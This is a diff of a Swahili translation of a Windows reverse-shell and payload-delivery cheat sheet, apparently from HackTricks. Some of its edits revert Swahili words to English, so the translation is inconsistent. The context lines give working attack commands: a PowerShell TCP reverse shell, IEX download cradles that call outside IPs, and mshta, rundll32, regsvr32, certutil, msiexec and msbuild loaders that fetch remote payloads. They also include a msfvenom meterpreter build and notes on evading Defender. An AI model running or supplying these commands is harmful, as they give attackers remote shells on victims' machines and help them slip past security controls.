@@ -4,8 +4,8 @@
 
 ## Lolbas
 
-Ukurasa [lolbas-project.github.io](https://lolbas-project.github.io/) ni wa Windows kama [https://gtfobins.github.io/](https://gtfobins.github.io/) ni wa linux.\
-Kwa wazi, **hakuna faili za SUID au ruhusa za sudo katika Windows**, lakini ni muhimu kujua **jinsi** baadhi ya **binaries** zinaweza kutumika (kuhujumiwa) kufanya aina fulani ya vitendo visivyotarajiwa kama **kutekeleza msimbo wa bahati nasibu.**
+The page [lolbas-project.github.io](https://lolbas-project.github.io/) ni ya Windows kama [https://gtfobins.github.io/](https://gtfobins.github.io/) ni ya linux.\
+Kwa wazi, **hakuna faili za SUID au ruhusa za sudo katika Windows**, lakini ni muhimu kujua **jinsi** baadhi ya **binaries** zinaweza kutumika (ku)fanya aina fulani za vitendo visivyotarajiwa kama **kutekeleza msimbo wa bahati nasibu.**
 
 ## NC
 ```bash
@@ -27,7 +27,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) ni mbadala wa Netcat unaoweza kubebeka na salama**. Inafanya kazi kwenye mifumo ya Unix kama na Win32. Ikiwa na vipengele kama vile usimbuaji mzito, utekelezaji wa programu, bandari za chanzo zinazoweza kubadilishwa, na kuunganishwa tena mara kwa mara, sbd inatoa suluhisho la kubadilika kwa mawasiliano ya TCP/IP. Kwa watumiaji wa Windows, toleo la sbd.exe kutoka kwa usambazaji wa Kali Linux linaweza kutumika kama mbadala wa kuaminika wa Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) ni mbadala wa Netcat unaoweza kubebeka na salama**. Inafanya kazi kwenye mifumo ya Unix kama vile na Win32. Ikiwa na vipengele kama vile usimbuaji wenye nguvu, utekelezaji wa programu, bandari za chanzo zinazoweza kubadilishwa, na kuunganishwa tena mara kwa mara, sbd inatoa suluhisho la kubadilika kwa mawasiliano ya TCP/IP. Kwa watumiaji wa Windows, toleo la sbd.exe kutoka kwa usambazaji wa Kali Linux linaweza kutumika kama mbadala wa kuaminika wa Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -60,13 +60,13 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 ```
 ## OpenSSH
 
-Mshambuliaji (Kali)
+Attacker (Kali)
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-Mtu aliyeathirika
+Mtu waathirika
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -82,7 +82,7 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Mchakato unaofanya wito wa mtandao: **powershell.exe**\
-Payload imeandikwa kwenye diski: **HAPANA** (_angalau mahali popote ambapo ningeweza kupata kwa kutumia procmon !_ )
+Payload imeandikwa kwenye diski: **HAPANA** (_angalau sio mahali popote nilipoweza kupata kwa kutumia procmon !_ )
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -93,7 +93,7 @@ Malipo yaliyoandikwa kwenye diski: **WebDAV client local cache**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Pata maelezo zaidi kuhusu Powershell Shells tofauti mwishoni mwa hati hii**
+**Pata maelezo zaidi kuhusu Shells tofauti za Powershell mwishoni mwa hati hii**
 
 ## Mshta
 
@@ -113,7 +113,7 @@ mshta \\webdavserver\folder\payload.hta
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Unaweza kupakua na kutekeleza kwa urahisi Koadic zombie ukitumia stager hta**
+**Unaweza kupakua na kutekeleza kwa urahisi sana zombie ya Koadic ukitumia stager hta**
 
 #### mfano wa hta
 
@@ -161,7 +161,7 @@ msf exploit(windows/misc/hta_server) > exploit
 ```bash
 Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
 ```
-**Imegunduliwa na mlinzi**
+**Imegunduliwa na defender**
 
 ## **Rundll32**
 
@@ -175,7 +175,7 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-**Imegunduliwa na mlinzi**
+**Imegunduliwa na defender**
 
 **Rundll32 - sct**
 
@@ -219,12 +219,12 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-**Imegunduliwa na mlinzi**
+**Imepatikana na mlinzi**
 
 #### Regsvr32 -sct
 
 [**Kutoka hapa**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-```markup
+```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
 <!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
@@ -259,7 +259,7 @@ Pakua B64dll, ikode na uitekeleze.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
-Pakua B64exe, ikode na uifanye kazi.
+Pakua B64exe, ibadilishe na uifanye kazi.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
@@ -298,7 +298,7 @@ Mshambuliaji
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
 ```
-Mtu aliyeathirika:
+Victim:
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
@@ -324,7 +324,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 **Haitambuliwi**
 
-**Unaweza kupakua na kutekeleza kwa urahisi sana Koadic zombie ukitumia stager wmic**
+**Unaweza kupakua na kutekeleza kwa urahisi Koadic zombie ukitumia stager wmic**
 
 ## Msbuild
 
@@ -332,12 +332,12 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Unaweza kutumia mbinu hii kupita vizuizi vya Application Whitelisting na vizuizi vya Powershell.exe. Kwa hivyo utaonyeshwa na PS shell.\
-Pakua hii na uifanye: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
+Unaweza kutumia mbinu hii kupita Application Whitelisting na vizuizi vya Powershell.exe. Kwa kuwa utapewa shell ya PS.\
+Pakua hii na uitekeleze: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
-**Haitagundulika**
+**Haitagunduliwa**
 
 ## **CSC**
 
@@ -347,7 +347,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe s
 ```
 Unaweza kupakua shell ya msingi ya C# kutoka hapa: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
-**Haijagundulika**
+**Haitambuliwi**
 
 ## **Regasm/Regsvc**
 
@@ -438,11 +438,11 @@ Anza msfconsole na rasilimali iliyoundwa:
 ```
 msfconsole -r unicorn.rc
 ```
-Anza seva ya wavuti inayotoa faili _powershell_attack.txt_ na uendeleze katika mwathirika:
+Anza seva ya wavuti inayotoa faili _powershell_attack.txt_ na utekeleze katika mwathiriwa:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**Imepatikana kama msimbo mbaya**
+**Imedhamini kama msimbo mbaya**
 
 ## Zaidi
 
